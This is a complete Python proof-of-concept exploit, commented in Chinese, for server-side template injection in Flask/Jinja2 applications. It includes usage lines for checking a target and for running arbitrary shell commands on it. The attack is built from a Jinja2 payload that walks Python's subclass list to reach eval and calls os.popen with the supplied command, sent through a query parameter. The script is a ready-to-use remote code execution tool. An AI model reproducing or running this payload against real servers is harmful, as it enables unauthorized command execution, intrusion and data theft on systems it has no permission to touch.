#!/usr/bin/env python3
"""
Flask (Jinja2) 服务端模板注入漏洞 POC
用法：
    检测漏洞：       python poc.py -u http://target:8000 --check
    执行命令：       python poc.py -u http://target:8000 -c "id"
    自定义参数名：   python poc.py -u http://target:8000 -c "whoami" -p "name"
依赖： pip install requests
"""

import sys
import re
import urllib.parse
import argparse
import requests

class FlaskSSTI:
    def __init__(self, base_url, param='name', timeout=10):
        self.base_url = base_url.rstrip('/')
        self.param = param
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36'
        })

    def check_vuln(self):
        """使用 {{233*233}} 检测 SSTI 是否存在"""
        payload = "{{233*233}}"
        resp = self._send_payload(payload)
        if resp and "54289" in resp.text:
            return True
        return False

    def execute_command(self, command):
        """
        执行系统命令并返回输出
        """
        # 构造完整的 SSTI payload（利用 catch_warnings 获取 eval）
        # 压缩成一行，删除多余换行和空格
        payload = (
            "{% for c in [].__class__.__base__.__subclasses__() %}"
            "{% if c.__name__ == 'catch_warnings' %}"
            "{% for b in c.__init__.__globals__.values() %}"
            "{% if b.__class__ == {}.__class__ %}"
            "{% if 'eval' in b.keys() %}"
            "{{ b['eval']('__import__(\"os\").popen(\"" + command + "\").read()') }}"
            "{% endif %}"
            "{% endif %}"
            "{% endfor %}"
            "{% endif %}"
            "{% endfor %}"
        )
        resp = self._send_payload(payload)
        if resp:
            # 尝试从响应中提取命令输出（通常 payload 会直接输出命令结果）
            # 但可能包含其他 HTML 内容，尝试查找可能的结果
            # 简单返回整个响应文本，用户可自行提取
            return resp.text
        return None

    def _send_payload(self, payload):
        """发送 payload 并返回响应对象"""
        params = {self.param: payload}
        try:
            resp = self.session.get(self.base_url, params=params, timeout=self.timeout)
            return resp
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return None

def main():
    parser = argparse.ArgumentParser(description='Flask SSTI 漏洞利用 POC')
    parser.add_argument('-u', '--url', required=True, help='目标 URL (如 http://127.0.0.1:8000)')
    parser.add_argument('-p', '--param', default='name', help='注入参数名 (默认 name)')
    parser.add_argument('-c', '--command', help='要执行的系统命令 (如 id)')
    parser.add_argument('--check', action='store_true', help='仅检测漏洞是否存在')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时时间（秒）')
    args = parser.parse_args()

    exploit = FlaskSSTI(args.url, param=args.param, timeout=args.timeout)

    if args.check:
        print("[*] 检测 SSTI 漏洞...")
        if exploit.check_vuln():
            print("[+] 漏洞存在！")
        else:
            print("[-] 未检测到漏洞。")
        sys.exit(0)

    if args.command:
        print(f"[*] 执行命令: {args.command}")
        result = exploit.execute_command(args.command)
        if result:
            print("[+] 响应内容（可能包含命令输出）:")
            print(result)
        else:
            print("[-] 命令执行失败或无响应。")
    else:
        print("[-] 请指定 --check 或 -c 命令。")

if __name__ == '__main__':
    main()